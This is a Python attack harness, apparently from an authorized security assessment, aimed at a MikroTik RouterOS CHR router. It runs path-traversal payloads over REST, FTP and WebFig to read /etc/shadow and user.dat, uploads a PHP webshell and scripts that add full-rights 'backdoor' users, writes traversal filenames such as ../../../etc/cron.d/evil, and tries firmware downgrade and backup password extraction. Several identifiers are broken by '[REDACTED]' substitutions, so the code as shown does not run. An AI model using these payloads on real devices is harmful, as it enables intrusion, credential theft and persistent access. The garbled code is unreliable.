#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Filesystem & Firmware Attack Hunter
Phase 9, Script 5 of 6
Target: [REDACTED-INTERNAL-IP]

Tests (~100):
  1. Path traversal via all interfaces (~40)
  2. File upload abuse (~20)
  3. NPK package analysis (~15)
  4. Config backup analysis (~15)
  5. Firmware down[REDACTED] (~10)

Evidence: evidence/novel_filesystem.json
"""

import ftplib
import hashlib
import json
import os
import socket
import struct
import sys
import time
import traceback
import warnings
from io import BytesIO
from urllib.parse import quote

warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("novel_filesystem.py", phase=9)

# Track objects for cleanup
CLEANUP_FILES = []


# ── Helpers ──────────────────────────────────────────────────────────────────

def rest_delete(path, timeout=10):
    """DELETE a REST API resource."""
    try:
        r = requests.delete(
            f"http://{TARGET}/rest{path}",
            auth=(ADMIN_USER, ADMIN_PASS),
            timeout=timeout, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def ftp_connect(user=None, password=None, timeout=10):
    """Connect and login to FTP."""
    user = user or ADMIN_USER
    password = password or ADMIN_PASS
    ftp = ftplib.FTP()
    ftp.connect(TARGET, 21, timeout=timeout)
    ftp.login(user, password)
    return ftp


def periodic_health(test_count):
    """Check router health every 10 tests."""
    if test_count % 10 == 0 and test_count > 0:
        h = check_router_alive()
        if not h.get("alive"):
            log("  Router unreachable! Waiting for recovery...")
            wait_for_router(max_wait=60)
            return False
    return True


def cleanup_all():
    """Remove all files created during testing."""
    log("Cleaning up test files...")
    cleaned = 0
    for fid in CLEANUP_FILES:
        try:
            rest_delete(f"/file/{fid}")
            cleaned += 1
        except Exception:
            pass

    # Also try to remove by name via FTP
    try:
        ftp = ftp_connect(timeout=5)
        for name in ["_test_upload.txt", "_test_malicious.rsc",
                      "_test_fake.npk", "_test_fake.backup",
                      "_novel_test_backup.backup", "_novel_fs_test.txt"]:
            try:
                ftp.delete(name)
                cleaned += 1
            except Exception:
                pass
        ftp.quit()
    except Exception:
        pass

    log(f"  Cleaned {cleaned} files")


# =============================================================================
# Section 1: Path Traversal via All Interfaces (~40 tests)
# =============================================================================

def test_path_traversal():
    """Test directory traversal to read sensitive files via REST, FTP, and WebFig."""
    log("=" * 60)
    log("Section 1: Path Traversal via All Interfaces")
    log("=" * 60)

    test_count = 0

    # Target files to attempt reading
    target_files = [
        "/etc/passwd",
        "/rw/store/user.dat",
        "/nova/etc/",
        "/flash/nova/etc/passwd",
        "/rw/logs/",
        "/proc/version",
        "/proc/cpuinfo",
        "/etc/shadow",
        "/rw/store/",
    ]

    # Traversal patterns
    traversal_patterns = [
        ("basic_dotdot", "../../"),
        ("triple_dotdot", "../../../"),
        ("quad_dotdot", "../../../../"),
        ("double_slash", "....//....//"),
        ("url_encoded", "%2e%2e%2f"),
        ("double_url", "%252e%252e%252f"),
        ("overlong_utf8", "%c0%ae%c0%ae/"),
        ("null_terminate", "..%00/"),
        ("backslash", "..\\"),
        ("mixed", "..;/"),
    ]

    # ── 1a: REST API path traversal ──────────────────────────────────────────
    log("  Testing REST API path traversal...")
    for target in target_files[:5]:
        for pat_name, pattern in traversal_patterns:
            test_count += 1
            periodic_health(test_count)

            # Build traversal path
            depth = 5
            traversal = pattern * depth + target.lstrip("/")
            rest_path = f"/file/{traversal}"

            try:
                r = requests.get(
                    f"http://{TARGET}/rest{rest_path}",
                    auth=(ADMIN_USER, ADMIN_PASS),
                    timeout=10, verify=False,
                )

                sensitive = any(kw in r.text.lower()
                                for kw in ["root:", "bin/", "password", "user.dat",
                                           "nova", "linux", "processor"])
                is_anomaly = r.status_code == 200 and sensitive

                ec.add_test(
                    "path_traversal", f"REST {pat_name}: {target}",
                    f"REST path traversal ({pat_name}) to {target}",
                    f"HTTP {r.status_code}, sensitive={sensitive}",
                    {"pattern": pat_name, "target": target,
                     "full_path": rest_path[:200],
                     "status": r.status_code,
                     "body_preview": r.text[:500] if sensitive else r.text[:100],
                     "sensitive_content": sensitive},
                    anomaly=is_anomaly,
                )

                if is_anomaly:
                    ec.add_finding(
                        "CRITICAL",
                        f"REST path traversal: read {target} via {pat_name}",
                        f"GET /rest{rest_path} returned sensitive content",
                        cwe="CWE-22", cvss=9.1,
                    )

            except Exception as e:
                ec.add_test("path_traversal", f"REST {pat_name}: {target}",
                            "REST traversal test", f"Error: {e}")

    # ── 1b: FTP path traversal ───────────────────────────────────────────────
    log("  Testing FTP path traversal...")
    ftp_traversals = [
        ("cwd_dotdot", "CWD", "/../../../etc/passwd"),
        ("retr_dotdot", "RETR", "../../../etc/passwd"),
        ("list_dotdot", "LIST", "../../../"),
        ("cwd_encoded", "CWD", "/..%2f..%2fetc"),
        ("retr_null", "RETR", "../../../etc/passwd\x00.txt"),
        ("cwd_root", "CWD", "/"),
        ("cwd_rw", "CWD", "/rw/store/"),
        ("retr_userdat", "RETR", "../rw/store/user.dat"),
        ("cwd_nova", "CWD", "/nova/etc/"),
        ("cwd_proc", "CWD", "/proc/"),
    ]

    for name, cmd, path in ftp_traversals:
        test_count += 1
        periodic_health(test_count)

        try:
            ftp = ftp_connect(timeout=5)
            result = {"name": name, "command": cmd, "path": path}

            if cmd == "CWD":
                try:
                    resp = ftp.cwd(path)
                    result["response"] = resp
                    result["success"] = True
                    # Try to list files after CWD
                    try:
                        listing = []
                        ftp.retrlines("LIST", listing.append)
                        result["listing"] = listing[:20]
                    except Exception:
                        pass
                except ftplib.error_perm as e:
                    result["response"] = str(e)
                    result["success"] = False

            elif cmd == "RETR":
                try:
                    content = BytesIO()
                    ftp.retrbinary(f"RETR {path}", content.write)
                    file_data = content.getvalue()
                    result["response"] = f"Retrieved {len(file_data)} bytes"
                    result["success"] = True
                    result["content_preview"] = file_data[:500].decode("utf-8", errors="replace")
                except ftplib.error_perm as e:
                    result["response"] = str(e)
                    result["success"] = False

            elif cmd == "LIST":
                try:
                    listing = []
                    ftp.retrlines(f"LIST {path}", listing.append)
                    result["response"] = f"Listed {len(listing)} entries"
                    result["listing"] = listing[:20]
                    result["success"] = True
                except ftplib.error_perm as e:
                    result["response"] = str(e)
                    result["success"] = False

            sensitive = False
            content_str = str(result.get("content_preview", "")) + str(result.get("listing", ""))
            if any(kw in content_str.lower() for kw in ["root:", "password", "user.dat", "nova"]):
                sensitive = True

            ec.add_test(
                "path_traversal", f"FTP {name}",
                f"FTP {cmd} {path}",
                f"Success={result.get('success')}, sensitive={sensitive}",
                result,
                anomaly=(result.get("success") and sensitive),
            )

            if result.get("success") and sensitive:
                ec.add_finding(
                    "HIGH",
                    f"FTP path traversal: {name}",
                    f"FTP {cmd} {path} returned sensitive content",
                    cwe="CWE-22",
                )

            ftp.quit()
        except Exception as e:
            ec.add_test("path_traversal", f"FTP {name}",
                        f"FTP traversal test", f"Error: {e}")

    # ── 1c: WebFig path traversal (augmenting novel_webfig_deep.py) ──────────
    log("  Testing WebFig static file traversal to RouterOS-specific paths...")
    webfig_traversals = [
        "/webfig/../nova/etc/environment",
        "/webfig/../flash/rw/store/user.dat",
        "/webfig/../rw/disk/",
        "/webfig/../sys/",
        "/webfig/../dev/",
        "/skins/../nova/",
    ]
    for path in webfig_traversals:
        test_count += 1
        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=10, verify=False,
            )
            sensitive = any(kw in r.text.lower()
                            for kw in ["root:", "password", "nova", "linux"])
            ec.add_test(
                "path_traversal", f"WebFig: {path[:50]}",
                f"WebFig traversal to RouterOS path: {path}",
                f"HTTP {r.status_code}, sensitive={sensitive}",
                {"path": path, "status": r.status_code,
                 "body_preview": r.text[:300] if sensitive else r.text[:100]},
                anomaly=(r.status_code == 200 and sensitive),
            )
        except Exception as e:
            ec.add_test("path_traversal", f"WebFig: {path[:50]}",
                        "WebFig traversal", f"Error: {e}")


# =============================================================================
# Section 2: File Upload Abuse (~20 tests)
# =============================================================================

def test_file_upload():
    """Test file upload abuse via FTP and REST."""
    log("=" * 60)
    log("Section 2: File Upload Abuse")
    log("=" * 60)

    test_count = 0

    # ── 2a: Upload via FTP ───────────────────────────────────────────────────
    log("  Testing file uploads via FTP...")
    upload_tests = [
        ("plain_text", "_test_upload.txt", b"Test upload content\n"),
        ("rsc_script", "_test_malicious.rsc",
         b'/user add name=backdoor password=backdoor123 group=full\n'),
        ("fake_npk", "_test_fake.npk",
         b'\x89NPK\x00\x01\x00\x00' + b"fake_package_data" * 100),
        ("fake_backup", "_test_fake.backup",
         b'\x88\x00\x00\x00' + b"fake_backup_data" * 100),
        ("html_xss", "_test_xss.html",
         b'<html><script>alert("XSS")</script></html>'),
        ("php_webshell", "_test_shell.php",
         b'<?php system($_GET["cmd"]); ?>'),
    ]

    for name, filename, content in upload_tests:
        test_count += 1
        periodic_health(test_count)

        try:
            ftp = ftp_connect(timeout=5)
            bio = BytesIO(content)
            try:
                ftp.storbinary(f"STOR {filename}", bio)
                upload_success = True
            except ftplib.error_perm as e:
                upload_success = False
                ec.add_test(
                    "file_upload", f"FTP upload: {name}",
                    f"Upload {filename} via FTP",
                    f"Rejected: {e}",
                    {"filename": filename, "content_size": len(content),
                     "upload_success": False},
                )
                ftp.quit()
                continue

            ec.add_test(
                "file_upload", f"FTP upload: {name}",
                f"Upload {filename} ({len(content)} bytes) via FTP",
                f"Upload {'accepted' if upload_success else 'rejected'}",
                {"filename": filename, "content_size": len(content),
                 "upload_success": upload_success},
            )

            # Check if file is accessible via WebFig
            if upload_success:
                time.sleep(0.5)
                try:
                    r = requests.get(
                        f"http://{TARGET}/{filename}",
                        timeout=10, verify=False,
                    )
                    web_accessible = r.status_code == 200
                    ec.add_test(
                        "file_upload", f"WebFig access: {name}",
                        f"Check if uploaded {filename} is accessible via HTTP",
                        f"HTTP {r.status_code}, accessible={web_accessible}",
                        {"filename": filename, "status": r.status_code,
                         "accessible": web_accessible,
                         "content_type": r.headers.get("Content-Type", ""),
                         "body_preview": r.text[:200] if web_accessible else ""},
                        anomaly=web_accessible,
                    )
                    if web_accessible and name in ("html_xss", "php_webshell"):
                        ec.add_finding(
                            "HIGH",
                            f"Uploaded {filename} accessible via HTTP without auth",
                            f"File uploaded via FTP is served by WebFig at /{filename}",
                            cwe="CWE-434",
                        )
                except Exception as e:
                    ec.add_test("file_upload", f"WebFig access: {name}",
                                "Check file accessibility", f"Error: {e}")

                # Clean up
                try:
                    ftp2 = ftp_connect(timeout=5)
                    ftp2.delete(filename)
                    ftp2.quit()
                except Exception:
                    pass

            ftp.quit()
        except Exception as e:
            ec.add_test("file_upload", f"FTP upload: {name}",
                        "FTP upload test", f"Error: {e}")

    # ── 2b: Upload via REST API ──────────────────────────────────────────────
    log("  Testing file uploads via REST API...")
    rest_upload_tests = [
        ("rest_plain", "_rest_test.txt", b"REST upload test"),
        ("rest_rsc", "_rest_malicious.rsc",
         b'/user add name=backdoor2 password=backdoor2 group=full'),
    ]

    for name, filename, content in rest_upload_tests:
        test_count += 1
        try:
            # Try multipart upload
            r = requests.post(
                f"http://{TARGET}/rest/file",
                auth=(ADMIN_USER, ADMIN_PASS),
                files={"file": (filename, content)},
                timeout=10, verify=False,
            )
            ec.add_test(
                "file_upload", f"REST upload: {name}",
                f"Upload {filename} via REST multipart",
                f"HTTP {r.status_code}",
                {"filename": filename, "status": r.status_code,
                 "response": r.text[:300]},
            )
        except Exception as e:
            ec.add_test("file_upload", f"REST upload: {name}",
                        "REST upload test", f"Error: {e}")

    # ── 2c: Path traversal in upload filename ────────────────────────────────
    log("  Testing path traversal in upload filename...")
    traversal_filenames = [
        ("dotdot_etc", "../../../etc/cron.d/evil"),
        ("dotdot_rw", "../rw/store/evil.rsc"),
        ("dotdot_nova", "../../nova/etc/evil"),
        ("null_byte", "normal.txt\x00.npk"),
        ("unicode_dot", "\u2025/\u2025/evil.rsc"),
    ]

    for name, filename in traversal_filenames:
        test_count += 1
        try:
            ftp = ftp_connect(timeout=5)
            bio = BytesIO(b"traversal test content\n")
            try:
                ftp.storbinary(f"STOR {filename}", bio)
                ec.add_test(
                    "file_upload", f"Filename traversal: {name}",
                    f"Upload file with traversal in name: {repr(filename)[:60]}",
                    "Upload ACCEPTED (path traversal possible)",
                    {"filename": repr(filename), "upload_success": True},
                    anomaly=True,
                )
                ec.add_finding(
                    "HIGH",
                    f"FTP filename path traversal: {name}",
                    f"FTP STOR accepted filename '{repr(filename)}' — "
                    f"potential arbitrary file write",
                    cwe="CWE-22",
                )
                # Try to clean up
                try:
                    ftp.delete(filename)
                except Exception:
                    pass
            except ftplib.error_perm as e:
                ec.add_test(
                    "file_upload", f"Filename traversal: {name}",
                    f"Upload with traversal filename: {repr(filename)[:60]}",
                    f"Rejected: {e}",
                    {"filename": repr(filename), "upload_success": False},
                )
            ftp.quit()
        except Exception as e:
            ec.add_test("file_upload", f"Filename traversal: {name}",
                        "Filename traversal test", f"Error: {e}")


# =============================================================================
# Section 3: NPK Package Analysis (~15 tests)
# =============================================================================

def test_npk_analysis():
    """Analyze NPK package format and signature validation."""
    log("=" * 60)
    log("Section 3: NPK Package Analysis")
    log("=" * 60)

    test_count = 0

    # ── 3a: Check for existing packages ──────────────────────────────────────
    code, packages = rest_get("/system/package")
    if code == 200 and isinstance(packages, list):
        ec.add_test(
            "npk_analysis", "Installed packages",
            "List installed RouterOS packages",
            f"Found {len(packages)} packages",
            {"packages": packages},
        )
    else:
        ec.add_test("npk_analysis", "Installed packages",
                    "List packages", f"Failed: HTTP {code}")

    # ── 3b: Check for .npk files on filesystem ──────────────────────────────
    code, files = rest_get("/file")
    npk_files = []
    if code == 200 and isinstance(files, list):
        for f in files:
            fname = f.get("name", "")
            if fname.endswith(".npk"):
                npk_files.append(f)

        ec.add_test(
            "npk_analysis", "NPK files on filesystem",
            "Search for .npk files on router filesystem",
            f"Found {len(npk_files)} .npk files",
            {"npk_files": npk_files},
        )

    # ── 3c: Upload a malformed NPK and check handling ────────────────────────
    malformed_npks = [
        ("empty_npk", b"", "Empty file with .npk extension"),
        ("wrong_magic", b"\x00\x00\x00\x00" + b"A" * 100, "NPK with wrong magic bytes"),
        ("truncated_header", b"\x89NPK\x00\x01", "NPK with truncated header"),
        ("oversized_header", b"\x89NPK" + b"\xff" * 100, "NPK with invalid header sizes"),
        ("null_padded", b"\x89NPK" + b"\x00" * 200, "NPK with null-padded header"),
    ]

    for name, content, desc in malformed_npks:
        test_count += 1
        periodic_health(test_count)

        filename = f"_test_{name}.npk"
        try:
            ftp = ftp_connect(timeout=5)
            bio = BytesIO(content)
            try:
                ftp.storbinary(f"STOR {filename}", bio)
                ec.add_test(
                    "npk_analysis", f"Malformed NPK: {name}",
                    f"Upload malformed NPK ({desc})",
                    "Upload accepted",
                    {"name": name, "description": desc,
                     "content_size": len(content)},
                )

                # Check if router tries to install it
                time.sleep(1)
                code_check, pkg_check = rest_get("/system/package")
                # Look for error messages in log
                code_log, log_data = rest_get("/log")
                recent_errors = []
                if code_log == 200 and isinstance(log_data, list):
                    for entry in log_data[-20:]:
                        msg = entry.get("message", "").lower()
                        if any(kw in msg for kw in ["npk", "package", "install", "up[REDACTED]", "error"]):
                            recent_errors.append(entry)

                ec.add_test(
                    "npk_analysis", f"NPK install attempt: {name}",
                    f"Check if router attempts to process malformed NPK",
                    f"Related log entries: {len(recent_errors)}",
                    {"log_entries": recent_errors[:5]},
                )

                # Cleanup
                try:
                    ftp2 = ftp_connect(timeout=5)
                    ftp2.delete(filename)
                    ftp2.quit()
                except Exception:
                    pass

            except ftplib.error_perm as e:
                ec.add_test(
                    "npk_analysis", f"Malformed NPK: {name}",
                    f"Upload malformed NPK", f"Rejected: {e}",
                    {"name": name, "error": str(e)},
                )
            ftp.quit()
        except Exception as e:
            ec.add_test("npk_analysis", f"Malformed NPK: {name}",
                        "NPK upload test", f"Error: {e}")

    # ── 3d: Package update channel ───────────────────────────────────────────
    test_count += 1
    code, pkg_update = rest_get("/system/package/update")
    if code == 200:
        ec.add_test(
            "npk_analysis", "Package update config",
            "Check package update channel configuration",
            f"HTTP {code}",
            {"config": pkg_update},
        )

        # Check if channel can be changed
        if isinstance(pkg_update, dict):
            current_channel = pkg_update.get("channel", "")
            code_set, resp_set = rest_post(
                "/system/package/update/set",
                {"channel": "testing"},
            )
            ec.add_test(
                "npk_analysis", "Change update channel",
                "Test if package update channel can be changed to 'testing'",
                f"HTTP {code_set}",
                {"status": code_set, "response": str(resp_set)[:300]},
            )
            # Restore
            if current_channel:
                rest_post("/system/package/update/set", {"channel": current_channel})
    else:
        ec.add_test("npk_analysis", "Package update config",
                    "Check package update", f"HTTP {code}")


# =============================================================================
# Section 4: Config Backup Analysis (~15 tests)
# =============================================================================

def test_backup_analysis():
    """Create backups, download, and analyze for sensitive data."""
    log("=" * 60)
    log("Section 4: Config Backup Analysis")
    log("=" * 60)

    test_count = 0

    # ── 4a: Create backup (binary format) ────────────────────────────────────
    log("  Creating binary backup...")
    try:
        code, resp = rest_post("/system/backup/save",
                               {"name": "_novel_analysis_backup"})
        ec.add_test("backup_analysis", "Create binary backup",
                    "Create system backup in binary format via REST",
                    f"HTTP {code}",
                    {"status": code, "response": str(resp)[:300]})

        if code in [200, 201]:
            time.sleep(3)

            # Download via FTP
            try:
                ftp = ftp_connect(timeout=10)
                backup_data = BytesIO()

                # Find the backup file
                listing = []
                ftp.retrlines("LIST", listing.append)
                backup_file = None
                for line in listing:
                    if "_novel_analysis_backup" in line:
                        parts = line.split()
                        backup_file = parts[-1] if parts else None
                        break

                if backup_file:
                    ftp.retrbinary(f"RETR {backup_file}", backup_data.write)
                    data = backup_data.getvalue()

                    ec.add_test("backup_analysis", "Download backup via FTP",
                                f"Downloaded backup: {backup_file}",
                                f"Size: {len(data)} bytes",
                                {"filename": backup_file, "size": len(data),
                                 "md5": hashlib.md5(data).hexdigest()})

                    # Analyze backup content
                    # Check for plaintext passwords
                    data_str = data.decode("utf-8", errors="replace")
                    sensitive_strings = []
                    for keyword in ["password", "secret", "key", "passphrase",
                                    "TestPass", "FullTest", "ReadTest", "WriteTest",
                                    ADMIN_PASS]:
                        if keyword.lower() in data_str.lower():
                            # Find context around the match
                            idx = data_str.lower().index(keyword.lower())
                            context = data_str[max(0, idx-20):idx+len(keyword)+20]
                            sensitive_strings.append({
                                "keyword": keyword,
                                "context": repr(context),
                            })

                    has_plaintext_passwords = any(
                        kw in data_str for kw in [ADMIN_PASS, "FullTest", "ReadTest", "WriteTest"]
                    )

                    ec.add_test(
                        "backup_analysis", "Backup content analysis",
                        "Analyze backup file for sensitive data in plaintext",
                        f"Sensitive matches: {len(sensitive_strings)}, "
                        f"plaintext_passwords={has_plaintext_passwords}",
                        {"sensitive_strings": sensitive_strings[:20],
                         "plaintext_passwords": has_plaintext_passwords,
                         "backup_size": len(data),
                         "magic_bytes": data[:16].hex() if data else ""},
                        anomaly=has_plaintext_passwords,
                    )

                    if has_plaintext_passwords:
                        ec.add_finding(
                            "MEDIUM",
                            "Backup file contains plaintext passwords",
                            f"Binary backup contains user passwords in plaintext/recoverable form",
                            cwe="CWE-312",
                        )

                    # Check backup file format
                    ec.add_test(
                        "backup_analysis", "Backup format analysis",
                        "Analyze backup file structure",
                        f"Magic bytes: {data[:8].hex() if len(data) >= 8 else 'N/A'}, "
                        f"size: {len(data)}",
                        {"magic_hex": data[:32].hex() if len(data) >= 32 else "",
                         "is_encrypted": b"\x88\xac\xa1" in data[:16] or b"encrypted" in data[:100].lower(),
                         "has_header": len(data) > 16},
                    )

                    # Delete the backup file
                    try:
                        ftp.delete(backup_file)
                    except Exception:
                        pass
                else:
                    ec.add_test("backup_analysis", "Download backup",
                                "Find backup file on filesystem",
                                "Backup file not found in FTP listing",
                                {"listing": listing[:10]}, anomaly=True)

                ftp.quit()
            except Exception as e:
                ec.add_test("backup_analysis", "Download backup via FTP",
                            "Download backup", f"Error: {e}")
    except Exception as e:
        ec.add_test("backup_analysis", "Create binary backup",
                    "Backup creation", f"Error: {e}")

    # ── 4b: Export configuration (text format) ───────────────────────────────
    log("  Exporting configuration via SSH...")
    test_count += 1
    try:
        stdout, stderr, rc = ssh_command("/export")
        if rc == 0 and stdout:
            # Analyze exported config
            config = stdout
            sensitive_fields = []
            for keyword in ["password=", "secret=", "key=", "passphrase=",
                            "community=", "wpa-pre-shared-key="]:
                for line in config.split("\n"):
                    if keyword in line.lower():
                        sensitive_fields.append(line.strip()[:100])

            ec.add_test(
                "backup_analysis", "Export config analysis",
                "Analyze SSH /export for sensitive data",
                f"Config size: {len(config)}, sensitive fields: {len(sensitive_fields)}",
                {"config_size": len(config),
                 "sensitive_fields": sensitive_fields[:20],
                 "line_count": len(config.split("\n"))},
                anomaly=len(sensitive_fields) > 0,
            )
        else:
            ec.add_test("backup_analysis", "Export config",
                        "Export via SSH", f"RC={rc}, stderr={stderr[:200]}")
    except Exception as e:
        ec.add_test("backup_analysis", "Export config",
                    "Config export test", f"Error: {e}")

    # ── 4c: Backup with encryption ───────────────────────────────────────────
    test_count += 1
    try:
        code, resp = rest_post("/system/backup/save",
                               {"name": "_novel_encrypted_backup",
                                "password": "TestEncrypt123"})
        ec.add_test("backup_analysis", "Encrypted backup creation",
                    "Create encrypted backup with password",
                    f"HTTP {code}",
                    {"status": code, "response": str(resp)[:300]})

        if code in [200, 201]:
            time.sleep(2)
            # Download and compare to unencrypted
            try:
                ftp = ftp_connect(timeout=5)
                enc_data = BytesIO()
                ftp.retrbinary("RETR _novel_encrypted_backup.backup", enc_data.write)
                enc_bytes = enc_data.getvalue()

                enc_str = enc_bytes.decode("utf-8", errors="replace")
                has_plaintext = any(kw in enc_str for kw in [ADMIN_PASS, "FullTest"])

                ec.add_test(
                    "backup_analysis", "Encrypted backup analysis",
                    "Check if encrypted backup actually encrypts passwords",
                    f"Size: {len(enc_bytes)}, plaintext_leaked: {has_plaintext}",
                    {"size": len(enc_bytes),
                     "plaintext_passwords": has_plaintext,
                     "magic_hex": enc_bytes[:32].hex() if len(enc_bytes) >= 32 else ""},
                    anomaly=has_plaintext,
                )

                if has_plaintext:
                    ec.add_finding(
                        "MEDIUM",
                        "Encrypted backup still contains plaintext passwords",
                        "Backup created with encryption password still has cleartext credentials",
                        cwe="CWE-312",
                    )

                try:
                    ftp.delete("_novel_encrypted_backup.backup")
                except Exception:
                    pass
                ftp.quit()
            except Exception as e:
                ec.add_test("backup_analysis", "Encrypted backup analysis",
                            "Analyze encrypted backup", f"Error: {e}")
    except Exception as e:
        ec.add_test("backup_analysis", "Encrypted backup",
                    "Encrypted backup test", f"Error: {e}")


# =============================================================================
# Section 5: Firmware Down[REDACTED] (~10 tests)
# =============================================================================

def test_firmware_down[REDACTED]():
    """Test firmware down[REDACTED] protections."""
    log("=" * 60)
    log("Section 5: Firmware Down[REDACTED] Protection")
    log("=" * 60)

    test_count = 0

    # ── 5a: Check current version ────────────────────────────────────────────
    code, resource = rest_get("/system/resource")
    current_version = ""
    if code == 200 and isinstance(resource, dict):
        current_version = resource.get("version", "")
        ec.add_test(
            "firmware_down[REDACTED]", "Current firmware version",
            "Record current RouterOS version",
            f"Version: {current_version}",
            {"version": current_version,
             "architecture": resource.get("architecture-name", ""),
             "board": resource.get("board-name", "")},
        )

    # ── 5b: Check up[REDACTED] channel ────────────────────────────────────────────
    test_count += 1
    code, update = rest_get("/system/package/update")
    if code == 200:
        ec.add_test(
            "firmware_down[REDACTED]", "Update channel config",
            "Check package update channel and available updates",
            f"Channel config",
            {"config": update},
        )

    # ── 5c: Try to set down[REDACTED] channel ─────────────────────────────────────
    test_count += 1
    code, resp = rest_post("/system/package/update/set", {"channel": "testing"})
    ec.add_test(
        "firmware_down[REDACTED]", "Set update channel to testing",
        "Test if update channel can be switched to 'testing'",
        f"HTTP {code}",
        {"status": code, "response": str(resp)[:300]},
        anomaly=(code in [200, 201]),
    )
    # Restore to stable
    rest_post("/system/package/update/set", {"channel": "stable"})

    # ── 5d: Upload older NPK and attempt install ─────────────────────────────
    log("  Testing NPK with older version number...")
    test_count += 1
    # Create a fake NPK header with an older version
    fake_old_npk = (
        b"\x89NPK\x00\x01\x00\x00"  # magic + version
        + b"\x07\x00\x00\x00"  # version 7.0.0 (fake)
        + b"routeros-chr\x00"  # package name
        + b"\x00" * 100  # padding
    )
    try:
        ftp = ftp_connect(timeout=5)
        bio = BytesIO(fake_old_npk)
        try:
            ftp.storbinary("STOR _old_version.npk", bio)
            ec.add_test(
                "firmware_down[REDACTED]", "Upload older version NPK",
                "Upload fake NPK claiming older version",
                "Upload accepted",
                {"size": len(fake_old_npk)},
            )

            # Check if router queued it for install
            time.sleep(2)
            code, reboot_info = rest_get("/system/package")
            scheduled = any(
                "schedule" in str(pkg).lower() or "queued" in str(pkg).lower()
                for pkg in (reboot_info if isinstance(reboot_info, list) else [])
            )
            ec.add_test(
                "firmware_down[REDACTED]", "Down[REDACTED] package queued",
                "Check if fake older NPK was queued for installation",
                f"Queued: {scheduled}",
                {"scheduled": scheduled},
                anomaly=scheduled,
            )
            if scheduled:
                ec.add_finding(
                    "HIGH",
                    "Firmware down[REDACTED] possible via uploaded NPK",
                    "Router accepted and queued a fake NPK with older version",
                    cwe="CWE-757",
                )

            # Clean up
            try:
                ftp.delete("_old_version.npk")
            except Exception:
                pass
        except ftplib.error_perm as e:
            ec.add_test("firmware_down[REDACTED]", "Upload older version NPK",
                        "Upload fake old NPK", f"Rejected: {e}")
        ftp.quit()
    except Exception as e:
        ec.add_test("firmware_down[REDACTED]", "Upload older version NPK",
                    "Firmware down[REDACTED] test", f"Error: {e}")

    # ── 5e: Check auto-up[REDACTED] config ────────────────────────────────────────
    test_count += 1
    code, auto_up[REDACTED] = rest_get("/system/package/update")
    if code == 200 and isinstance(auto_up[REDACTED], dict):
        ec.add_test(
            "firmware_down[REDACTED]", "Auto-up[REDACTED] configuration",
            "Check auto-up[REDACTED] settings for manipulation vectors",
            f"Config: {auto_up[REDACTED]}",
            {"config": auto_up[REDACTED]},
        )

    # ── 5f: RouterBOARD firmware ─────────────────────────────────────────────
    test_count += 1
    code, rb = rest_get("/system/routerboard")
    if code == 200 and isinstance(rb, dict):
        ec.add_test(
            "firmware_down[REDACTED]", "RouterBOARD firmware info",
            "Check RouterBOARD firmware version and up[REDACTED] status",
            f"Info available",
            {"routerboard": rb},
        )


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Filesystem & Firmware Attacks")
    log(f"Target: {TARGET}")
    log("Phase 9 — novel_filesystem.py")
    log("=" * 60)

    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    try:
        test_path_traversal()      # ~40 tests
        test_file_upload()         # ~20 tests
        test_npk_analysis()        # ~15 tests
        test_backup_analysis()     # ~15 tests
        test_firmware_down[REDACTED]()  # ~10 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        log("=" * 60)
        log("Post-test cleanup")
        log("=" * 60)
        cleanup_all()

        final = check_router_alive()
        log(f"Final health: {final}")

        ec.save("novel_filesystem.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
